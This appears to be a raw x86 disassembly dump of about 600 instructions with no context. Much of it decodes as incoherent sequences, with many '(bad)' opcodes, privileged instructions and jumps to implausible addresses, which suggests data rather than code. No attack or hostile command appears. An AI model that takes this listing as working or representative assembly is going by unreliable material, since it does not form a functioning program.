  430a1f:	add    BYTE PTR [ebx],al
  430a21:	mov    eax,eax
  430a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a24:	inc    ebp
  430a25:	dec    ebp
  430a26:	xor    DWORD PTR [ebx],esi
  430a28:	pushf  
  430a29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430a2f:	rdmsr  
  430a31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430a39:	sar    eax,1
  430a3b:	rol    BYTE PTR [ebp+0x5],1
  430a3e:	xor    eax,DWORD PTR [ebp+0x3]
  430a41:	jmp    0x430a2e
  430a43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a49:	xor    eax,DWORD PTR [ebp+0x33]
  430a4c:	mov    eax,DWORD PTR [ebx]
  430a4e:	rol    BYTE PTR [ebx],1
  430a50:	test   BYTE PTR [edi],cl
  430a52:	fwait
  430a53:	shl    DWORD PTR [edx],0x4d
  430a56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430a5c:	xor    edx,eax
  430a5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430a64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430a6a:	add    BYTE PTR [ebx],dh
  430a6c:	inc    ebp
  430a6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430a73:	rdpmc  
  430a75:	rol    DWORD PTR [ebx],0x4d
  430a78:	loopne 0x430a05
  430a7a:	push   ebp
  430a7b:	in     al,dx
  430a7c:	mov    cl,dl
  430a7e:	adc    eax,edx
  430a80:	jb     0x430a87
  430a82:	add    BYTE PTR [ebp+0x45],al
  430a85:	jmp    0x430a12
  430a87:	mov    ebx,eax
  430a89:	test   al,0xcb
  430a8b:	dec    ebp
  430a8c:	dec    ebp
  430a8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430a93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430a99:	dec    ebp
  430a9a:	mov    al,0x8b
  430a9c:	dec    ebp
  430a9d:	in     al,dx
  430a9e:	xor    edx,ecx
  430aa0:	xor    edx,eax
  430aa2:	add    eax,DWORD PTR [ebp+0x3]
  430aa5:	jbe    0x430ab6
  430aa7:	mov    eax,ecx
  430aa9:	test   al,0x45
  430aab:	dec    ebp
  430aac:	mov    DWORD PTR [ebx],esi
  430aae:	loopne 0x430ae3
  430ab0:	inc    ebp
  430ab1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430ab7:	rol    esi,0x45
  430aba:	scas   eax,DWORD PTR es:[edi]
  430abb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430ac1:	mov    eax,ecx
  430ac3:	hlt    
  430ac4:	dec    ebp
  430ac5:	inc    ebp
  430ac6:	mov    eax,edi
  430ac8:	loopne 0x430aa2
  430aca:	retf   
  430acb:	test   esi,ecx
  430acd:	clc    
  430ace:	scas   eax,DWORD PTR es:[edi]
  430acf:	inc    ebp
  430ad0:	mov    eax,edi
  430ad2:	fdiv   st,st(0)
  430ad4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430ada:	fwait
  430adb:	xor    esi,DWORD PTR [edx]
  430add:	pushf  
  430ade:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430ae4:	inc    esi
  430ae6:	mov    ebp,DWORD PTR [eax-0x10]
  430ae9:	inc    ebp
  430aea:	dec    ebp
  430aeb:	xor    esi,DWORD PTR [ebx]
  430aed:	add    eax,DWORD PTR [ebx]
  430aef:	loopne 0x430b00
  430af1:	dec    ebp
  430af2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430af9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430aff:	lock fwait
  430b01:	ret    
  430b02:	xor    al,BYTE PTR [ebp-0x77]
  430b05:	mov    esi,esp
  430b07:	rol    BYTE PTR [ebp-0x7c],1
  430b0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430b10:	call   edi
  430b12:	enter  0x4d45,0x8b
  430b16:	mov    esi,eax
  430b18:	fmul   st(3),st
  430b1a:	push   ebp
  430b1b:	dec    ebp
  430b1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b22:	ret    0xc19b
  430b25:	xor    al,BYTE PTR [esi-0x280276]
  430b2b:	dec    ebp
  430b2c:	jne    0x430b61
  430b2e:	mov    eax,DWORD PTR [ebx]
  430b30:	cld    
  430b31:	loopne 0x430ae3
  430b33:	push   ebp
  430b34:	add    DWORD PTR [eax+0x72851100],ecx
  430b3a:	inc    DWORD PTR [eax]
  430b3c:	inc    DWORD PTR [ebp-0x75]
  430b3f:	mov    edi,esp
  430b41:	lock add bl,0x1
  430b45:	retf   
  430b46:	add    dh,al
  430b48:	xor    dh,cl
  430b4a:	inc    ebp
  430b4b:	scas   eax,DWORD PTR es:[edi]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	shl    al,0x0
  430b51:	inc    ebp
  430b52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b58:	call   0x461e90
  430b5d:	ud0    eax,ecx
  430b60:	adc    al,0x4d
  430b62:	inc    ebp
  430b63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430b69:	lock push 0x338055
  430b6f:	add    eax,DWORD PTR [eax]
  430b71:	ud0    ecx,edx
  430b74:	sbb    BYTE PTR [ebp+0x5e],dl
  430b77:	xor    ecx,ecx
  430b79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430b80:	push   ecx
  430b81:	add    BYTE PTR [ebp-0x38],cl
  430b84:	mov    DWORD PTR [esi-0x740004],eax
  430b8a:	cld    
  430b8b:	inc    ebp
  430b8c:	jmp    0x430b19
  430b8e:	mov    esp,esp
  430b90:	mov    ebx,eax
  430b92:	mov    eax,esi
  430b94:	clc    
  430b95:	scas   eax,DWORD PTR es:[edi]
  430b96:	icebp  
  430b97:	mov    esi,DWORD PTR [ebp-0x28]
  430b9a:	(bad)  
  430b9b:	retf   
  430b9c:	or     ecx,eax
  430b9e:	(bad)  
  430b9f:	dec    ebp
  430ba0:	pop    es
  430ba1:	(bad)  
  430ba2:	(bad)  
  430ba3:	or     BYTE PTR [esi],al
  430ba5:	jb     0x430b6d
  430ba7:	add    BYTE PTR [ebx],al
  430ba9:	inc    ebp
  430baa:	(bad)  
  430bab:	mov    ecx,DWORD PTR [edx]
  430bad:	fadd   st(6),st
  430baf:	ret    
  430bb0:	add    ah,BYTE PTR [ebp-0x37]
  430bb3:	int    0x55
  430bb5:	sub    ebp,esp
  430bb7:	add    edx,DWORD PTR [ecx-0x14]
  430bba:	inc    ebp
  430bbb:	inc    ebp
  430bbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bc2:	cld    
  430bc3:	(bad)  
  430bc4:	(bad)  
  430bc5:	scas   eax,DWORD PTR es:[edi]
  430bc6:	loopne 0x430c03
  430bc8:	mov    DWORD PTR [edi],ecx
  430bca:	mov    ebp,ebp
  430bcc:	clc    
  430bcd:	push   eax
  430bcf:	push   DWORD PTR [ebp-0x4]
  430bd2:	mov    BYTE PTR [ebp+0xa],0xff
  430bd6:	(bad)  
  430bd7:	int3   
  430bd8:	or     BYTE PTR [eax],al
  430bda:	(bad)  
  430bdb:	lea    eax,[edi]
  430bdd:	ins    BYTE PTR es:[edi],dx
  430bde:	(bad)  
  430bdf:	inc    DWORD PTR [ecx]
  430be1:	push   eax
  430be2:	mov    BYTE PTR [ebp+0x9],0x8b
  430be6:	leave  
  430be7:	les    edx,FWORD PTR [ebp+0x0]
  430bea:	in     al,dx
  430beb:	call   DWORD PTR [ecx-0x75]
  430bee:	inc    ebp
  430bef:	cld    
  430bf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430bf6:	cld    
  430bf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430bfd:	pop    es
  430bfe:	mov    eax,DWORD PTR [eax]
  430c00:	clc    
  430c01:	test   eax,esi
  430c03:	je     0x430c7a
  430c05:	mov    eax,esi
  430c07:	cld    
  430c08:	add    al,0x80
  430c0a:	add    WORD PTR [ecx+0x0],ax
  430c0e:	fiadd  DWORD PTR [eax]
  430c10:	mov    BYTE PTR [eax],0x3d
  430c13:	push   0xffffffc3
  430c15:	push   edi
  430c16:	mov    edx,DWORD PTR [eax+0x51]
  430c19:	pop    edi
  430c1a:	lea    ebx,[ebx-0x8]
  430c1d:	ret    0x45
  430c20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c26:	xchg   eax,edi
  430c28:	mov    DWORD PTR [ebp-0x75],ecx
  430c2b:	push   esi
  430c2c:	clc    
  430c2d:	jne    0x430bff
  430c2f:	mov    ecx,0xf8450b0b
  430c34:	(bad)  
  430c35:	push   cs
  430c36:	or     BYTE PTR [ebp-0x3a],dh
  430c39:	cmp    eax,DWORD PTR [ecx]
  430c3b:	pop    esi
  430c3c:	(bad)  
  430c3d:	or     al,0x5
  430c3f:	inc    eax
  430c40:	leave  
  430c41:	jmp    0x40cf:0x25564204
  430c48:	leave  
  430c49:	in     eax,dx
  430c4a:	inc    DWORD PTR [eax-0x75]
  430c4d:	fimul  DWORD PTR [ebx-0x228139be]
  430c53:	inc    eax
  430c54:	nop
  430c55:	loopne 0x430c56
  430c57:	ret    
  430c58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c5e:	add    eax,0xff45e8f8
  430c63:	push   esi
  430c64:	push   DWORD PTR [ebp-0x39]
  430c67:	mov    eax,0x7edda46
  430c6c:	or     al,0x6
  430c6e:	push   DWORD PTR [ebp-0x3a]
  430c71:	cmp    eax,DWORD PTR [edx]
  430c73:	pop    esi
  430c74:	ret    
  430c75:	or     al,0x56
  430c77:	inc    ecx
  430c78:	push   ebp
  430c79:	jle    0x430c67
  430c7b:	inc    edx
  430c7c:	inc    ebp
  430c7d:	int    0x1
  430c7f:	inc    ecx
  430c80:	sub    BYTE PTR ds:0xe77541fc,ah
  430c86:	add    DWORD PTR [edx+0x1c],eax
  430c89:	retf   0xc38b
  430c8c:	adc    al,0x8b
  430c8e:	xchg   edx,eax
  430c8f:	push   ecx
  430c90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c96:	rcl    DWORD PTR [esi-0x9],cl
  430c99:	jne    0x430ceb
  430c9b:	mov    eax,0x7c80ece
  430ca0:	rol    DWORD PTR [esi],cl
  430ca2:	div    DWORD PTR [ebp+0x50]
  430ca5:	cmp    ecx,edx
  430ca7:	pop    esi
  430ca8:	dec    BYTE PTR [edx]
  430caa:	in     al,dx
  430cab:	inc    edx
  430cac:	sub    esp,ecx
  430cae:	inc    eax
  430caf:	(bad)  
  430cb0:	push   eax
  430cb1:	add    edx,DWORD PTR [eax-0x1f]
  430cb4:	push   edi
  430cb5:	add    dh,dh
  430cb7:	leave  
  430cb8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cbc:	add    BYTE PTR [ecx+0x0],dl
  430cbf:	inc    ebp
  430cc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430ccc:	add    al,0x2
  430cce:	jmp    0x57eb828
  430cd3:	jne    0x430cbd
  430cd5:	mov    eax,DWORD PTR [edx]
  430cd7:	or     BYTE PTR [eax],al
  430cd9:	inc    ecx
  430cda:	stc    
  430cdb:	in     eax,dx
  430cdc:	ss inc eax
  430cde:	aas    
  430cdf:	out    0x7d,eax
  430ce1:	inc    ecx
  430ce2:	mov    ebp,ecx
  430ce4:	lock ret 0x7d
  430ce8:	and    ecx,DWORD PTR [ebx-0x171777]
  430cee:	add    bh,bh
  430cf0:	aad    0xd7
  430cf2:	add    dh,cl
  430cf4:	clts   
  430cf6:	(bad)  
  430cf7:	call   0xffce0bfc
  430cfc:	hlt    
  430cfd:	iret   
  430cfe:	jge    0x430cd6
  430d00:	rol    DWORD PTR [esi-0x80],cl
  430d03:	jmp    0x1c5c10
  430d08:	out    dx,al
  430d09:	mov    eax,DWORD PTR [ebx]
  430d0b:	(bad)  
  430d0c:	pop    esi
  430d0d:	push   es
  430d0e:	cmp    al,0xe8
  430d10:	sar    edi,0x8
  430d13:	inc    DWORD PTR [edi]
  430d15:	inc    esi
  430d16:	(bad)  
  430d17:	loopne 0x430d97
  430d19:	push   edi
  430d1a:	push   cs
  430d1b:	push   ebx
  430d1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430d22:	add    BYTE PTR [ebp+0x50],al
  430d25:	push   eax
  430d26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d2c:	sub    edx,DWORD PTR [esi-0x24]
  430d2f:	jne    0x430ce7
  430d31:	lods   eax,DWORD PTR ds:[esi]
  430d32:	mov    edx,DWORD PTR [edx-0x34]
  430d35:	dec    esi
  430d36:	out    0x83,eax
  430d38:	into   
  430d39:	push   edi
  430d3b:	loopne 0x430d0b
  430d3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d48:	rol    DWORD PTR [edx],0x8
  430d4b:	mov    esp,ecx
  430d4d:	cmp    DWORD PTR [ebx],0xc
  430d50:	mov    esi,0x5001c0
  430d55:	push   eax
  430d56:	push   cs
  430d57:	push   eax
  430d58:	(bad)  
  430d59:	sub    edx,edi
  430d5b:	push   esi
  430d5c:	adc    al,0xcb
  430d5e:	ins    DWORD PTR es:[edi],dx
  430d5f:	mov    eax,0x203e8
  430d64:	add    al,ah
  430d66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d6d:	add    dh,al
  430d6f:	add    ah,ch
  430d71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d77:	pop    ecx
  430d78:	or     eax,ebx
  430d7a:	cli    
  430d7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d81:	lea    ebp,[ebx]
  430d83:	mov    edx,DWORD PTR [edx-0x4]
  430d86:	dec    ecx
  430d87:	inc    ebp
  430d88:	shr    BYTE PTR [ebx],0x4b
  430d8b:	and    al,0x0
  430d8d:	(bad)  
  430d8e:	jne    0x430dd5
  430d90:	pop    eax
  430d91:	mov    al,0x5a
  430d93:	call   0x1420ff2
  430d98:	and    al,0x85
  430d9a:	push   edx
  430d9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d9f:	dec    ebp
  430da0:	mov    cl,0x23
  430da2:	jmp    0x430d90
  430da4:	mov    al,0xe7
  430da6:	call   0x1391094
  430dab:	shr    DWORD PTR [eax+ebx*2],cl
  430dae:	lock (bad) 
  430db0:	adc    eax,0x757f008d
  430db5:	out    0x58,eax
  430db7:	cmp    al,0x7
  430db9:	pop    edx
  430dba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dc1:	push   ecx
  430dc2:	cld    
  430dc3:	mov    esi,0x3b0175
  430dc8:	and    al,0xb0
  430dca:	xor    BYTE PTR [edx+0x1],0x8b
  430dce:	add    ah,bh
  430dd0:	mov    edi,DWORD PTR [ebp-0x4]
  430dd3:	psubsw mm7,QWORD PTR [edi]
  430dd6:	add    DWORD PTR [ebp+0x0],ebp
  430dd9:	rcr    eax,1
  430ddb:	mov    edi,ecx
  430ddd:	and    eax,DWORD PTR [eax]
  430ddf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430de5:	call   0x13010ce
  430dea:	add    al,cl
  430dec:	mov    ebp,esi
  430dee:	aam    0x83
  430df0:	or     DWORD PTR [ecx],eax
  430df2:	jne    0x430de5
  430df4:	mov    eax,DWORD PTR [eax]
  430df6:	aam    0x0
  430df8:	dec    ebp
  430df9:	jne    0x430d86
  430dfb:	cmp    ebx,eax
  430dfd:	jb     0x430e4c
  430dff:	jmp    0x430d8c
  430e01:	mov    ebx,esp
  430e03:	int3   
  430e04:	dec    ebp
  430e05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e0c:	mov    edx,0x8b0a8b
  430e11:	cmp    ecx,DWORD PTR [eax]
  430e13:	jb     0x430dec
  430e15:	pop    edx
  430e16:	push   edi
  430e17:	cli    
  430e18:	pop    es
  430e19:	mov    eax,ecx
  430e1b:	jb     0x430e1f
  430e1d:	add    DWORD PTR [ebx],0xa
  430e20:	mov    eax,DWORD PTR [ebx]
  430e22:	int3   
  430e23:	add    bh,BYTE PTR [esi+0x75d10006]
  430e29:	jmp    0x430db6
  430e2b:	mov    al,0xe8
  430e2d:	call   0x10410af
  430e32:	add    edx,DWORD PTR [ecx+ecx*8]
  430e35:	pop    edi
  430e36:	or     BYTE PTR [ecx-0x73],bl
  430e39:	pop    ecx
  430e3a:	inc    edi
  430e3b:	xor    al,0xeb
  430e3d:	push   ecx
  430e3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e44:	call   0xb20f49
  430e49:	int3   
  430e4a:	sbb    BYTE PTR [esi],ch
  430e4c:	inc    ebp
  430e4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e53:	call   0x9c10c2
  430e58:	or     BYTE PTR [ebx-0x73],dl
  430e5b:	cmp    al,0x47
  430e5d:	mov    al,0x1
  430e5f:	jb     0x430e61
  430e61:	mov    al,0x10
  430e63:	push   eax
  430e64:	add    al,0x75
  430e66:	add    BYTE PTR [ebx],ch
  430e68:	add    ebx,esp
  430e6a:	int3   
  430e6b:	jne    0x430e7d
  430e6d:	movsx  edx,cl
  430e70:	add    DWORD PTR [eax],eax
  430e72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e79:	mov    gs,edi
  430e7b:	add    BYTE PTR [eax-0x50],ch
  430e7e:	add    al,ch
  430e80:	mov    eax,DWORD PTR [ecx]
  430e82:	sub    eax,DWORD PTR [eax]
  430e84:	jb     0x430efb
  430e86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e8a:	jge    0x430e74
  430e8c:	add    al,0x1
  430e8e:	add    DWORD PTR [eax],0x0
  430e91:	jne    0x430e93
  430e93:	je     0x430eda
  430e95:	mov    eax,DWORD PTR [edi]
  430e97:	ror    BYTE PTR [ebp+0x4d],1
  430e9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ea1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ea7:	mov    DWORD PTR [ebx],ebp
  430ea9:	fadd   DWORD PTR [eax+0x75]
  430eac:	inc    eax
  430ead:	pop    eax
  430eae:	lea    ebx,[ecx+0x4f]
  430eb1:	push   0xb1000003
  430eb6:	out    dx,eax
  430eb7:	add    ebp,DWORD PTR [edx+edx*2]
  430eba:	add    BYTE PTR [ebx+ecx*4],bh
  430ebd:	mov    ch,BYTE PTR [ebx]
  430ebf:	jb     0x430f33
  430ec1:	add    al,0x89
  430ec3:	push   eax
  430ec4:	call   0x842b5c36
  430ec9:	add    DWORD PTR [eax+eax*1],eax
  430ecc:	jae    0x430ee2
  430ece:	icebp  
  430ecf:	inc    ebp
  430ed0:	mov    eax,DWORD PTR gs:[ecx]
  430ed3:	int3   
  430ed4:	out    dx,al
  430ed5:	loopne 0x430f24
  430ed7:	sub    eax,DWORD PTR [edx]
  430ed9:	push   0xffffff83
  430edb:	pop    esi
  430edc:	push   cs
  430edd:	jl     0x430ef8
  430edf:	add    al,0xaf
  430ee1:	xor    eax,0x832b6d00
  430ee6:	mov    eax,DWORD PTR [edx]
  430ee8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ef4:	inc    ebp
  430ef5:	shr    ebx,0x3
  430ef8:	or     DWORD PTR [eax],0x4
  430efb:	push   0xffffffa5
  430efd:	pop    esi
  430efe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f05:	jmp    0x430f64
  430f07:	mov    edi,0xff0272
  430f0c:	fdivr  QWORD PTR [ebp+0x5d]
  430f0f:	push   0x4e
  430f11:	pop    ecx
  430f12:	call   0x435317
  430f17:	mov    DWORD PTR [ebx],eax
  430f19:	in     al,0xc8
  430f1b:	rol    BYTE PTR [ebp-0x75],0xc1
  430f1f:	call   0xad1100
  430f24:	pop    esi
  430f25:	enter  0xceff,0x8b
  430f29:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f2d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f34:	je     0x430f36
  430f36:	or     DWORD PTR [ebx-0x74183b24],eax
  430f3c:	jne    0x430f22
  430f3e:	jmp    0x430f39
  430f40:	push   DWORD PTR [edx-0x24]
  430f43:	push   0x4d
  430f45:	pop    ecx
  430f46:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f4a:	jge    0x430f52
  430f4c:	mov    eax,eax
  430f4e:	sub    ebp,DWORD PTR [edx+0x24]
  430f51:	pop    esi
  430f52:	inc    ebp
  430f53:	mov    esp,0x8b6077
  430f58:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f5e:	lods   al,BYTE PTR ds:[esi]
  430f5f:	add    BYTE PTR [ebx],bh
  430f61:	enter  0xce73,0x49
  430f65:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f6d:	stc    
  430f6e:	jge    0x430fe2
  430f70:	jnp    0xdd4292df
  430f76:	call   0xc6104c
  430f7b:	fadd   st(0),st
  430f7d:	dec    esi
  430f7e:	ins    BYTE PTR es:[edi],dx
  430f7f:	stc    
  430f80:	cmp    al,0x73
  430f82:	push   ebp
  430f83:	mov    eax,0xf8028b
  430f88:	jne    0x430f4b
  430f8a:	mov    esi,ecx
  430f8c:	mov    esp,DWORD PTR [ebp+0x2c]
  430f8f:	add    edi,DWORD PTR [ebp-0x24]
  430f92:	sub    esp,eax
  430f94:	and    al,0x45
  430f96:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f9c:	sbb    al,0xee
  430f9e:	pop    esi
  430f9f:	call   0x830fcf
  430fa4:	fsubr  st,st(3)
  430fa6:	sti    
  430fa7:	add    BYTE PTR gs:[ecx],bh
  430faa:	add    eax,esp
  430fac:	add    DWORD PTR [esi],eax
  430fae:	rol    DWORD PTR [ebp+0x8],0x29
  430fb2:	mov    esp,eax
  430fb4:	clc    
  430fb5:	jne    0x43102c
  430fb7:	mov    eax,0x8b0673
  430fbc:	loopne 0x431003
  430fbe:	loopne 0x430f49
  430fc0:	lods   al,BYTE PTR ds:[esi]
  430fc1:	int3   
  430fc2:	inc    ebp
  430fc3:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fc7:	add    al,0xc3
  430fc9:	sub    ecx,DWORD PTR [ebp+0x47]
  430fcc:	(bad)  
  430fce:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fd2:	add    eax,DWORD PTR [eax]
  430fd4:	call   0x644d0d9
  430fd9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fdf:	dec    esi
  430fe0:	ins    DWORD PTR es:[edi],dx
  430fe1:	in     al,dx
  430fe2:	lea    eax,[eax]
  430fe4:	inc    ebp
  430fe5:	inc    ebp
  430fe6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430ff6:	and    al,0xdc
  430ff8:	ror    DWORD PTR [edx+0x24],0xf7
  430ffc:	or     BYTE PTR [ebp+0x4c],dh
  430fff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431003:	stos   BYTE PTR es:[edi],al
  431004:	adc    edx,edi
  431006:	inc    esp
  431007:	add    edi,DWORD PTR [eax]
  431009:	jne    0x430fee
  43100b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431011:	cmp    ecx,DWORD PTR [edi]
  431013:	sub    BYTE PTR [ebp-0x7e],dl
  431016:	sar    ebp,0xb
  431019:	jmp    FWORD PTR [edi+0x2400392a]
  43101f:	sub    esi,DWORD PTR [ebx-0x73]
  431022:	mov    esp,DWORD PTR [ecx+edi*4]
  431025:	mov    ecx,DWORD PTR [eax]
  431027:	and    BYTE PTR [eax],al
  431029:	jne    0x430ff5
  43102b:	sub    ebp,ecx
  43102d:	sbb    BYTE PTR [esi+0x32],ah
  431030:	dec    ebp
  431031:	push   ebp
  431032:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431038:	ret    
  431039:	mov    edx,ebp
  43103b:	leave  
  43103c:	sub    DWORD PTR [esi+0x24],ebx
  43103f:	ret    0x2b
  431042:	pop    ax
  431044:	push   ebp
  431045:	rol    BYTE PTR [ebx],0xeb
  431048:	add    DWORD PTR [ecx+0x6c0001],0x40
  43104f:	jb     0x4310a6
  431051:	ret    
  431052:	in     al,dx
  431053:	jecxz  0x430fe0
  431055:	push   esi
  431056:	xchg   esp,eax
  431057:	jne    0x431059
  431059:	cmp    edx,DWORD PTR [esi+0x1c]
  43105c:	jne    0x431042
  43105e:	mov    eax,DWORD PTR [ebp-0x77]
  431061:	ror    DWORD PTR [ebx+0x899408],0xe0
  431068:	mov    esi,DWORD PTR [ebp-0x75]
  43106b:	pop    esi
  43106c:	nop
  43106d:	mov    eax,DWORD PTR [eax]
  43106f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431075:	add    al,0x0
  431077:	inc    ebp
  431078:	mov    eax,DWORD PTR [ebx]
  43107a:	mov    ebp,ebx
  43107c:	cmp    al,0xf
  43107e:	or     al,al
  431080:	inc    ebp
  431081:	inc    ebp
  431082:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431088:	cld    
  431089:	add    BYTE PTR [edi+0x546c16c0],dh
  43108f:	add    BYTE PTR [ecx-0x5],dl
  431092:	add    eax,0x17200
  431097:	sbb    al,0x85
  431099:	dec    esp
  43109a:	je     0x4310d4
  43109c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310a0:	add    BYTE PTR [ebx],bh
  4310a2:	(bad)  
  4310a3:	and    al,0x32
  4310a5:	jae    0x431043
  4310a7:	mov    cl,cl
  4310a9:	inc    DWORD PTR [esp]
  4310ac:	push   ebp
  4310ad:	shr    esp,0x8
  4310b0:	in     al,dx
  4310b1:	push   esp
  4310b2:	add    DWORD PTR [eax],esp
  4310b4:	add    bl,cl
  4310b6:	inc    ebp
  4310b7:	mov    bh,0x89
  4310b9:	add    ah,bh
  4310bb:	jmp    0xca752005
  4310c0:	pushf  
  4310c1:	dec    esp
  4310c2:	mov    edx,0xf8178520
  4310c7:	fst    DWORD PTR [ebp+0x0]
  4310ca:	mov    BYTE PTR [eax],0xc4
  4310cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4310d0:	inc    ebp
  4310d1:	add    eax,0xc601da
  4310d6:	mov    al,0xc6
  4310d9:	ins    BYTE PTR es:[edi],dx
  4310da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310e1:	dec    esp
  4310e2:	jmp    DWORD PTR [eax]
  4310e4:	inc    ebp
  4310e5:	fnstcw WORD PTR [esi+0x29]
  4310e8:	test   BYTE PTR [eax],0xc8
  4310eb:	rol    BYTE PTR [eax],0xc0
  4310ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4310f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310fa:	inc    esi
  4310fb:	add    DWORD PTR [eax],ebx
  4310fd:	add    dh,bh
  4310ff:	mov    esi,DWORD PTR [edx+0x8]
  431102:	(bad)  
  431103:	fdiv   QWORD PTR ss:[ecx]
  431106:	(bad)  
  431107:	mov    bl,ch
  431109:	add    esi,eax
  43110b:	add    dh,bl
  43110d:	or     esi,eax
  43110f:	mov    dl,0xdf
  431111:	add    esi,eax
  431113:	add    al,ah
  431115:	push   cs
  431116:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43111d:	or     BYTE PTR [ebx],dh
  43111f:	dec    ecx
  431120:	lea    eax,[ebx]
  431122:	xor    eax,0x18fc0fc7
  431127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431128:	repz clc 
  43112a:	add    eax,DWORD PTR [ebp+0x46]
  43112d:	prefetcht0 BYTE PTR [ecx-0x2]
  431131:	xor    eax,0x7c60872
  431136:	mov    esp,0xbd32c69b
  43113b:	pop    esi
  43113c:	mov    cl,0xbe
  43113f:	or     al,0xc6
  431141:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431148:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43114f:	add    dh,al
  431151:	mov    eax,ebx
  431153:	xor    DWORD PTR [ebx],0x35008dbc
  431159:	mov    ecx,DWORD PTR [edi]
  43115b:	sbb    al,0x18
  43115d:	inc    ebp
  43115e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431165:	clc    
  431166:	(bad)  
  431167:	xor    DWORD PTR [edx-0x64],esi
  43116a:	lea    ecx,[ecx+0x45ffe838]
  431170:	mov    ecx,ebx
  431172:	fadd   st,st(6)
  431174:	dec    ebp
  431175:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43117b:	out    0x1,eax
  43117d:	inc    ebp
  43117e:	lea    ebp,ds:0xc8ffc6ff
  431184:	enter  0xa33,0xc6
  431188:	push   ebp
  431189:	leave  
  43118a:	(bad)  
  43118b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431191:	add    BYTE PTR [ebp+0x44],al
  431194:	mov    eax,esp
  431196:	mov    WORD PTR [esi+0x46398300],?
  43119c:	psubusw mm4,QWORD PTR [esi-0x78]
  4311a0:	add    BYTE PTR [ebx-0x1303f975],al
  4311a6:	add    BYTE PTR [ebp+0x1],0xeb
  4311aa:	add    BYTE PTR [ebp+0x38],al
  4311ad:	in     eax,dx
  4311ae:	inc    ebp
  4311af:	inc    ebp
  4311b0:	mov    ebx,ebx
  4311b2:	add    BYTE PTR [ebp+0x0],0xec
  4311b6:	mov    DWORD PTR [ebp-0x41],eax
  4311b9:	sub    eax,0x2c00454e
  4311be:	ins    DWORD PTR es:[edi],dx
  4311bf:	inc    ebp
  4311c0:	add    BYTE PTR [esi+0x66],bh
